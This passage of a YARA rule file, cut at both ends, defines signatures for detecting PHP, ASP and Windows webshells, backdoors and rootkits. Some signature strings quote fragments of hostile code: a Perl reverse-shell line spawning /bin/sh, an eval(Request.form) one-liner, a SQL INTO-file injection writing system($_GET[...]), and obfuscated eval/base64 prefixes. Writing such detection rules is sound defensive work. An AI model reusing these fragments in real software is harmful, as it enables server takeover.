	$s0 = "eval(gzinflate(str_rot13(base64_decode('"
condition:
	all of them
}
rule Php_Webshell_Debug_BDoor
{
strings:
	$s1 = "\\BDoor\\"
	$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
condition:
	all of them
}
rule Php_Webshell_bin_Client
{
strings:
	$s0 = "Recieved respond from server!!"
	$s4 = "packet door client"
	$s5 = "input source port(whatever you want):"
	$s7 = "Packet sent,waiting for reply..."
condition:
	all of them
}
rule Php_Webshell_ZXshell2_0_rar_Folder_ZXshell
{
strings:
	$s0 = "WPreviewPagesn"
	$s1 = "DA!OLUTELY N"
condition:
	all of them
}
rule Php_Webshell_RkNTLoad
{
strings:
	$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
	$s2 = "5pur+virtu!"
	$s3 = "ugh spac#n"
	$s4 = "xcEx3WriL4"
	$s5 = "runtime error"
	$s6 = "loseHWait.Sr."
	$s7 = "essageBoxAw"
	$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"
condition:
	all of them
}
rule Php_Webshell_binder2_binder2
{
strings:
	$s0 = "IsCharAlphaNumericA"
	$s2 = "WideCharToM"
	$s4 = "g 5pur+virtu!"
	$s5 = "\\syslog.en"
	$s6 = "heap7'7oqk?not="
	$s8 = "- Kablto in"
condition:
	all of them
}
rule Php_Webshell_thelast_orice2
{
strings:
	$s0 = " $aa = $_GET['aa'];"
	$s1 = "echo $aa;"
condition:
	all of them
}
rule Php_Webshell_FSO_s_sincap
{
strings:
	$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
	$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
condition:
	all of them
}
rule Php_Webshell_PhpShell
{
strings:
	$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
condition:
	all of them
}
rule Php_Webshell_HYTop_DevPack_config
{
strings:
	$s0 = "const adminPassword=\""
	$s2 = "const userPassword=\""
	$s3 = "const mVersion="
condition:
	all of them
}
rule Php_Webshell_sendmail
{
strings:
	$s3 = "_NextPyC808"
	$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"
condition:
	all of them
}
rule Php_Webshell_FSO_s_zehir4
{
strings:
	$s5 = " byMesaj "
condition:
	all of them
}
rule Php_Webshell_hkshell_hkshell
{
strings:
	$s1 = "PrSessKERNELU"
	$s2 = "Cur3ntV7sion"
	$s3 = "Explorer8"
condition:
	all of them
}
rule Php_Webshell_iMHaPFtp
{
strings:
	$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
condition:
	all of them
}
rule Php_Webshell_Unpack_TBack
{
strings:
	$s5 = "\\final\\new\\lcc\\public.dll"
condition:
	all of them
}
rule Php_Webshell_DarkSpy105
{
strings:
	$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"
condition:
	all of them
}
rule Php_Webshell_EditServer_EXE
{
strings:
	$s2 = "Server %s Have Been Configured"
	$s5 = "The Server Password Exceeds 32 Characters"
	$s8 = "9--Set Procecess Name To Inject DLL"
condition:
	all of them
}
rule Php_Webshell_FSO_s_reader
{
strings:
	$s2 = "mailto:mailbomb@hotmail."
condition:
	all of them
}
rule Asp_Webshell_ASP_CmdAsp
{
strings:
	$s2 = "' -- Read the output from our command and remove the temp file -- '"
	$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
	$s9 = "' -- create the COM objects that we will be using -- '"
condition:
	all of them
}
rule Php_Webshell_KA_uShell
{
strings:
	$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
	$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
condition:
	all of them
}
rule Php_Webshell_PHP_Backdoor_v1
{
strings:
	$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
	$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
condition:
	all of them
}
rule Php_Webshell_svchostdll
{
strings:
	$s0 = "InstallService"
	$s1 = "RundllInstallA"
	$s2 = "UninstallService"
	$s3 = "&G3 Users In RegistryD"
	$s4 = "OL_SHUTDOWN;I"
	$s5 = "SvcHostDLL.dll"
	$s6 = "RundllUninstallA"
	$s7 = "InternetOpenA"
	$s8 = "Check Cloneomplete"
condition:
	all of them
}
rule Php_Webshell_HYTop_DevPack_server
{
strings:
	$s0 = "<!-- PageServer Below -->"
condition:
	all of them
}
rule Php_Webshell_vanquish
{
strings:
	$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
	$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
	$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"
condition:
	all of them
}
rule Php_Webshell_winshell
{
strings:
	$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
	$s1 = "WinShell Service"
	$s2 = "__GLOBAL_HEAP_SELECTED"
	$s3 = "__MSVCRT_HEAP_SELECT"
	$s4 = "Provide Windows CmdShell Service"
	$s5 = "URLDownloadToFileA"
	$s6 = "RegisterServiceProcess"
	$s7 = "GetModuleBaseNameA"
	$s8 = "WinShell v5.0 (C)2002 janker.org"
condition:
	all of them
}
rule Php_Webshell_FSO_s_remview
{
strings:
	$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
	$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
	$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
condition:
	all of them
}
rule Php_Webshell_saphpshell
{
strings:
	$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
condition:
	all of them
}
rule Php_Webshell_HYTop2006_rar_Folder_2006Z
{
strings:
	$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
	$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"
condition:
	all of them
}
rule Php_Webshell_admin_ad
{
strings:
	$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
	$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
condition:
	all of them
}
rule Php_Webshell_FSO_s_casus15
{
strings:
	$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
condition:
	all of them
}
rule Php_Webshell_BIN_Client
{
strings:
	$s0 = "=====Remote Shell Closed====="
	$s2 = "All Files(*.*)|*.*||"
	$s6 = "WSAStartup Error!"
	$s7 = "SHGetFileInfoA"
	$s8 = "CreateThread False!"
	$s9 = "Port Number Error"
condition:
	4 of them
}
rule Php_Webshell_shelltools_g0t_root_uptime
{
strings:
	$s0 = "JDiamondCSlC~"
	$s1 = "CharactQA"
	$s2 = "$Info: This file is packed with the UPX executable packer $"
	$s5 = "HandlereateConso"
	$s7 = "ION\\System\\FloatingPo"
condition:
	all of them
}
rule Php_Webshell_Simple_PHP_BackDooR
{
strings:
	$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
	$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
	$s9 = "// a simple php backdoor"
condition:
	1 of them
}
rule Php_Webshell_sig_2005Gray
{
strings:
	$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
	$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
	$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
	$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
condition:
	all of them
}
rule Php_Webshell_DllInjection
{
strings:
	$s0 = "\\BDoor\\DllInjecti"
condition:
	all of them
}
rule Php_Webshell_Mithril_v1_45_Mithril
{
strings:
	$s2 = "cress.exe"
	$s7 = "\\Debug\\Mithril."
condition:
	all of them
}
rule Php_Webshell_hkshell_hkrmv
{
strings:
	$s5 = "/THUMBPOSITION7"
	$s6 = "\\EvilBlade\\"
condition:
	all of them
}
rule Php_Webshell_phpshell
{
strings:
	$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
	$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
	$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
condition:
	all of them
}
rule Php_Webshell_FSO_s_cmd
{
strings:
	$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
	$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
condition:
	all of them
}
rule Php_Webshell_FeliksPack3___PHP_Shells_phpft
{
strings:
	$s6 = "PHP Files Thief"
	$s11 = "http://www.4ngel.net"
condition:
	all of them
}
rule Php_Webshell_FSO_s_indexer
{
strings:
	$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
condition:
	all of them
}
rule Php_Webshell_r57shell
{
strings:
	$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
condition:
	all of them
}
rule Php_Webshell_bdcli100
{
strings:
	$s5 = "unable to connect to "
	$s8 = "backdoor is corrupted on "
condition:
	all of them
}
rule Php_Webshell_HYTop_DevPack_2005Red
{
strings:
	$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
	$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
	$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
condition:
	all of them
}
rule Php_Webshell_HYTop2006_rar_Folder_2006X2
{
strings:
	$s2 = "Powered By "
	$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
condition:
	all of them
}
rule Php_Webshell_rdrbs084
{
strings:
	$s0 = "Create mapped port. You have to specify domain when using HTTP type."
	$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"
condition:
	all of them
}
rule Php_Webshell_HYTop_CaseSwitch_2005
{
strings:
	$s1 = "MSComDlg.CommonDialog"
	$s2 = "CommonDialog1"
	$s3 = "__vbaExceptHandler"
	$s4 = "EVENT_SINK_Release"
	$s5 = "EVENT_SINK_AddRef"
	$s6 = "By Marcos"
	$s7 = "EVENT_SINK_QueryInterface"
	$s8 = "MethCallEngine"
condition:
	all of them
}
rule Php_Webshell_eBayId_index3
{
strings:
	$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
condition:
	all of them
}
rule Php_Webshell_FSO_s_phvayv
{
strings:
	$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
condition:
	all of them
}
rule Php_Webshell_byshell063_ntboot
{
strings:
	$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
	$s1 = "Failure ... Access is Denied !"
	$s2 = "Dumping Description to Registry..."
	$s3 = "Opening Service .... Failure !"
condition:
	all of them
}
rule Php_Webshell_FSO_s_casus15_2
{
strings:
	$s0 = "copy ( $dosya_gonder"
condition:
	all of them
}
rule Php_Webshell_installer
{
strings:
	$s0 = "Restore Old Vanquish"
	$s4 = "ReInstall Vanquish"
condition:
	all of them
}
rule Php_Webshell_FSO_s_remview_2
{
strings:
	$s0 = "<xmp>$out</"
	$s1 = ".mm(\"Eval PHP code\")."
condition:
	all of them
}
rule Php_Webshell_FeliksPack3___PHP_Shells_r57
{
strings:
	$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
condition:
	all of them
}
rule Php_Webshell_HYTop2006_rar_Folder_2006X
{
strings:
	$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
	$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
condition:
	all of them
}
rule Php_Webshell_FSO_s_phvayv_2
{
strings:
	$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
condition:
	all of them
}
rule Php_Webshell_elmaliseker
{
strings:
	$s0 = "javascript:Command('Download'"
	$s5 = "zombie_array=array("
condition:
	all of them
}
rule Php_Webshell_shelltools_g0t_root_resolve
{
strings:
	$s0 = "3^n6B(Ed3"
	$s1 = "^uldn'Vt(x"
	$s2 = "\\= uPKfp"
	$s3 = "'r.axV<ad"
	$s4 = "p,modoi$=sr("
	$s5 = "DiamondC8S t"
	$s6 = "`lQ9fX<ZvJW"
condition:
	all of them
}
rule Php_Webshell_FSO_s_RemExp
{
strings:
	$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
	$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
	$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
condition:
	all of them
}
rule Php_Webshell_FSO_s_tool
{
strings:
	$s7 = "\"\"%windir%\\\\calc.exe\"\")"
condition:
	all of them
}
rule Php_Webshell_FeliksPack3___PHP_Shells_2005
{
strings:
	$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
	$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
condition:
	all of them
}
rule Php_Webshell_byloader
{
strings:
	$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
	$s1 = "Failure ... Access is Denied !"
	$s2 = "NTFS Disk Driver Checking Service"
	$s3 = "Dumping Description to Registry..."
	$s4 = "Opening Service .... Failure !"
condition:
	all of them
}
rule Php_Webshell_shelltools_g0t_root_Fport
{
strings:
	$s4 = "Copyright 2000 by Foundstone, Inc."
	$s5 = "You must have administrator privileges to run fport - exiting..."
condition:
	all of them
}
rule Php_Webshell_BackDooR__fr_
{
strings:
	$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "
condition:
	all of them
}
rule Php_Webshell_FSO_s_ntdaddy
{
strings:
	$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
condition:
	all of them
}
rule Php_Webshell_nstview_nstview
{
strings:
	$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
condition:
	all of them
}
rule Php_Webshell_HYTop_DevPack_upload
{
strings:
	$s0 = "<!-- PageUpload Below -->"
condition:
	all of them
}
rule Php_Webshell_PasswordReminder
{
strings:
	$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
condition:
	all of them
}
rule Php_Webshell_Pack_InjectT
{
strings:
	$s3 = "ail To Open Registry"
	$s4 = "32fDssignim"
	$s5 = "vide Internet S"
	$s6 = "d]Software\\M"
	$s7 = "TInject.Dll"
condition:
	all of them
}
rule Php_Webshell_FSO_s_RemExp_2
{
strings:
	$s2 = " Then Response.Write \""
	$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
condition:
	all of them
}
rule Php_Webshell_FSO_s_c99
{
strings:
	$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
condition:
	all of them
}
rule Php_Webshell_rknt_zip_Folder_RkNT
{
strings:
	$s0 = "PathStripPathA"
	$s1 = "`cLGet!Addr%"
	$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
	$s3 = "oQToOemBuff* <="
	$s4 = "ionCdunAsw[Us'"
	$s6 = "CreateProcessW: %S"
	$s7 = "ImageDirectoryEntryToData"
condition:
	all of them
}
rule Php_Webshell_dbgntboot
{
strings:
	$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
	$s3 = "sth junk the M$ Wind0wZ retur"
condition:
	all of them
}
rule Php_Webshell_PHP_shell
{
strings:
	$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
	$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
condition:
	all of them
}
rule Php_Webshell_hxdef100
{
strings:
	$s0 = "RtlAnsiStringToUnicodeString"
	$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
	$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
condition:
	all of them
}
rule Php_Webshell_rdrbs100
{
strings:
	$s3 = "Server address must be IP in A.B.C.D format."
	$s4 = " mapped ports in the list. Currently "
condition:
	all of them
}
rule Php_Webshell_Mithril_Mithril
{
strings:
	$s0 = "OpenProcess error!"
	$s1 = "WriteProcessMemory error!"
	$s4 = "GetProcAddress error!"
	$s5 = "HHt`HHt\\"
	$s6 = "Cmaudi0"
	$s7 = "CreateRemoteThread error!"
	$s8 = "Kernel32"
	$s9 = "VirtualAllocEx error!"
condition:
	all of them
}
rule Php_Webshell_hxdef100_2
{
strings:
	$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
	$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
	$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
condition:
	all of them
}
rule Php_Webshell_Release_dllTest
{
strings:
	$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
	$s1 = "0 0&00060K0R0X0f0l0q0w0"
	$s2 = ": :$:(:,:0:4:8:D:`=d="
	$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
	$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
	$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
	$s6 = "0)0O0\\0a0o0\"1E1P1q1"
	$s7 = "<.<I<d<h<l<p<t<x<|<"
	$s8 = "3&31383>3F3Q3X3`3f3w3|3"
	$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
condition:
	all of them
}
rule Php_Webshell_webadmin
{
strings:
	$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
condition:
	all of them
}
rule Php_Webshell_commands
{
strings:
	$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
	$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
condition:
	all of them
}
rule Php_Webshell_hkdoordll
{
strings:
	$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
condition:
	all of them
}
rule Php_Webshell_r57shell_2
{
strings:
	$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
condition:
	all of them
}
rule Php_Webshell_Mithril_v1_45_dllTest
{
strings:
	$s3 = "syspath"
	$s4 = "\\Mithril"
	$s5 = "--list the services in the computer"
condition:
	all of them
}
rule Php_Webshell_dbgiis6cli
{
strings:
	$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
	$s5 = "###command:(NO more than 100 bytes!)"
condition:
	all of them
}
rule Php_Webshell_remview_2003_04_22
{
strings:
	$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
condition:
	all of them
}
rule Php_Webshell_FSO_s_test
{
strings:
	$s0 = "$yazi = \"test\" . \"\\r\\n\";"
	$s2 = "fwrite ($fp, \"$yazi\");"
condition:
	all of them
}
rule Php_Webshell_Debug_cress
{
strings:
	$s0 = "\\Mithril "
	$s4 = "Mithril.exe"
condition:
	all of them
}
rule Php_Webshell_webshell
{
strings:
	$s0 = "RhViRYOzz"
	$s1 = "d\\O!jWW"
	$s2 = "bc!jWW"
	$s3 = "0W[&{l"
	$s4 = "[INhQ@\\"
condition:
	all of them
}
rule Php_Webshell_FSO_s_EFSO_2
{
strings:
	$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
	$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
condition:
	all of them
}
rule Php_Webshell_thelast_index3
{
strings:
	$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
condition:
	all of them
}
rule Php_Webshell_adjustcr
{
strings:
	$s0 = "$Info: This file is packed with the UPX executable packer $"
	$s2 = "$License: NRV for UPX is distributed under special license $"
	$s6 = "AdjustCR Carr"
	$s7 = "ION\\System\\FloatingPo"
condition:
	all of them
}
rule Php_Webshell_FeliksPack3___PHP_Shells_xIShell
{
strings:
	$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
condition:
	all of them
}
rule Php_Webshell_HYTop_AppPack_2005
{
strings:
	$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
condition:
	all of them
}
rule Php_Webshell_xssshell
{
strings:
	$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
condition:
	all of them
}
rule Php_Webshell_FeliksPack3___PHP_Shells_usr
{
strings:
	$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
condition:
	all of them
}
rule Php_Webshell_FSO_s_phpinj
{
strings:
	$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
condition:
	all of them
}
rule Php_Webshell_xssshell_db
{
strings:
	$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
condition:
	all of them
}
rule Php_Webshell_PHP_sh
{
strings:
	$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
condition:
	all of them
}
rule Php_Webshell_xssshell_default
{
strings:
	$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
condition:
	all of them
}
rule Php_Webshell_EditServer_2
{
strings:
	$s0 = "@HOTMAIL.COM"
	$s1 = "Press Any Ke"
	$s3 = "glish MenuZ"
condition:
	all of them
}
rule Php_Webshell_by064cli
{
strings:
	$s7 = "packet dropped,redirecting"
	$s9 = "input the password(the default one is 'by')"
condition:
	all of them
}
rule Php_Webshell_Mithril_dllTest
{
strings:
	$s0 = "please enter the password:"
	$s3 = "\\dllTest.pdb"
condition:
	all of them
}
rule Php_Webshell_peek_a_boo
{
strings:
	$s0 = "__vbaHresultCheckObj"
	$s1 = "\\VB\\VB5.OLB"
	$s2 = "capGetDriverDescriptionA"
	$s3 = "__vbaExceptHandler"
	$s4 = "EVENT_SINK_Release"
	$s8 = "__vbaErrorOverflow"
condition:
	all of them
}
rule Php_Webshell_fmlibraryv3
{
strings:
	$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
condition:
	all of them
}
rule Php_Webshell_Debug_dllTest_2
{
strings:
	$s4 = "\\Debug\\dllTest.pdb"
	$s5 = "--list the services in the computer"
condition:
	all of them
}
rule Php_Webshell_connector
{
strings:
	$s2 = "If ( AttackID = BROADCAST_ATTACK )"
	$s4 = "Add UNIQUE ID for victims / zombies"
condition:
	all of them
}
rule Php_Webshell_shelltools_g0t_root_HideRun
{
strings:
	$s0 = "Usage -- hiderun [AppName]"
	$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
condition:
	all of them
}
rule Php_Webshell_PHP_Shell_v1_7
{
strings:
	$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
condition:
	all of them
}
rule Php_Webshell_xssshell_save
{
strings:
	$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
	$s5 = "VictimID = fm_NStr(Victims(i))"
condition:
	all of them
}
rule Php_Webshell_screencap
{
strings:
	$s0 = "GetDIBColorTable"
	$s1 = "Screen.bmp"
	$s2 = "CreateDCA"
condition:
	all of them
}
rule Php_Webshell_FSO_s_phpinj_2
{
strings:
	$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
condition:
	all of them
}
rule Php_Webshell_ZXshell2_0_rar_Folder_zxrecv
{
strings:
	$s0 = "RyFlushBuff"
	$s1 = "teToWideChar^FiYP"
	$s2 = "mdesc+8F D"
	$s3 = "\\von76std"
	$s4 = "5pur+virtul"
	$s5 = "- Kablto io"
	$s6 = "ac#f{lowi8a"
condition:
	all of them
}
rule Php_Webshell_FSO_s_ajan
{
strings:
	$s4 = "entrika.write \"BinaryStream.SaveToFile"
condition:
	all of them
}
rule Php_Webshell_c99shell
{
strings:
	$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
condition:
	all of them
}
rule Php_Webshell_phpspy_2005_full
{
strings:
	$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
condition:
	all of them
}
rule Php_Webshell_FSO_s_zehir4_2
{
strings:
	$s4 = "\"Program Files\\Serv-u\\Serv"
condition:
	all of them
}
rule Php_Webshell_FSO_s_indexer_2
{
strings:
	$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
condition:
	all of them
}
rule Php_Webshell_HYTop_DevPack_2005
{
strings:
	$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
	$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
	$s9 = "scrollbar-face-color:#E4E4F3;"
condition:
	all of them
}
rule Php_Webshell_root_040_zip_Folder_deploy
{
strings:
	$s5 = "halon synscan 127.0.0.1 1-65536"
	$s8 = "Obviously you replace the ip address with that of the target."
condition:
	all of them
}
rule Php_Webshell_by063cli
{
strings:
	$s2 = "#popmsghello,are you all right?"
	$s4 = "connect failed,check your network and remote ip."
condition:
	all of them
}
rule Asp_Webshell_icyfox007v1_10_rar_Folder_asp
{
strings:
	$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
condition:
	all of them
}
rule Php_Webshell_FSO_s_EFSO_2_2
{
strings:
	$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
	$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
condition:
	all of them
}
rule Php_Webshell_byshell063_ntboot_2
{
strings:
	$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
condition:
	all of them
}
rule Php_Webshell_u_uay
{
strings:
	$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
	$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
condition:
	1 of them
}
rule Php_Webshell_bin_wuaus
{
strings:
	$s1 = "9(90989@9V9^9f9n9v9"
	$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
	$s3 = ";(=@=G=O=T=X=\\="
	$s4 = "TCP Send Error!!"
	$s5 = "1\"1;1X1^1e1m1w1~1"
	$s8 = "=$=)=/=<=Y=_=j=p=z="
condition:
	all of them
}
rule Php_Webshell_pwreveal
{
strings:
	$s0 = "*<Blank - no es"
	$s3 = "JDiamondCS "
	$s8 = "sword set> [Leith=0 bytes]"
	$s9 = "ION\\System\\Floating-"
condition:
	all of them
}
rule Php_Webshell_shelltools_g0t_root_xwhois
{
strings:
	$s1 = "rting! "
	$s2 = "aTypCog("
	$s5 = "Diamond"
	$s6 = "r)r=rQreryr"
condition:
	all of them
}
rule Php_Webshell_vanquish_2
{
strings:
	$s2 = "Vanquish - DLL injection failed:"
condition:
	all of them
}
rule Php_Webshell_down_rar_Folder_down
{
strings:
	$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
condition:
	all of them
}
rule Php_Webshell_cmdShell
{
strings:
	$s1 = "if cmdPath=\"wscriptShell\" then"
condition:
	all of them
}
rule Php_Webshell_ZXshell2_0_rar_Folder_nc
{
strings:
	$s0 = "WSOCK32.dll"
	$s1 = "?bSUNKNOWNV"
